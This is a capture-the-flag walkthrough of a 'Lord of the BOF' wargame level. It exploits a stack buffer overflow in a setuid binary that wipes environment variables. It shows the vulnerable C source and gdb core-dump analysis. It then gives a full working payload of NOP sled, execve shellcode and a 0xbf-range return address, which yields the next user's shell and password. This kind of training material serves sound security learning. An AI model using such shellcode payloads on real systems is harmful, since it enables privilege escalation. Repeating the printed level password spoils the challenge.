# Level4

## This level's goal
- LEVEL4 (goblin -> orc) : egghunter

***

```
[goblin@localhost goblin]$ bash2
[goblin@localhost goblin]$ ls -l
total 20
-rwsr-sr-x    1 orc      orc         12567 Feb 26  2010 orc
-rw-r--r--    1 root     root          505 Mar 29  2010 orc.c
[goblin@localhost goblin]$ cat orc.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orc
        - egghunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

In the code, there are two conditions.
1. the egghunter seems that you cannot use env variable. (cannot use RTL method)
2. the retrun address's first byte should be "0xbf"

```
[goblin@localhost goblin]$ ulimit -s unlimited
```

Before you make a core file, you need to turn off the ASLR

```
[goblin@localhost goblin]$ gcc orc.c -o orc2
[goblin@localhost goblin]$ ./orc2 `python -c 'print "A"*46+"\xbf"'`
stack is still your friend.
[goblin@localhost goblin]$ ./orc2 `python -c 'print "A"*47+"\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA¿
Segmentation fault (core dumped)
[goblin@localhost goblin]$ ls -l | grep core
-rw-------    1 goblin   goblin      61440 Jun 14 10:55 core
[goblin@localhost goblin]$ gdb -q -c core
Core was generated by `./orc2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA¿'.
Program terminated with signal 11, Segmentation fault.
#0  0xbf414141 in ?? ()
(gdb) x/64x $esp
0xbffffc40:     0x00000000      0x6f2f2e00      0x00326372      0x41414141
0xbffffc50:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc60:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc70:     0x41414141      0x41414141      0xbf414141      0x00000000
0xbffffc80:     0x00000000      0x00000000      0x00000000      0x00000000
```

In the code, I just found the memory structrue(buf 40bytes + SFP 4bytes + RET 4bytes).

The payload will be NOP(19bytes) + Shell code(25bytes) + Return Address(0xbffffc50)

```
[goblin@localhost goblin]$ ./orc `python -c 'print "\x90"*19+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x50\xfc\xff\xbf"'`
bash$ id
uid=503(goblin) gid=503(goblin) euid=504(orc) egid=504(orc) groups=503(goblin)
bash$ my-pass
euid = 504
cantata
```

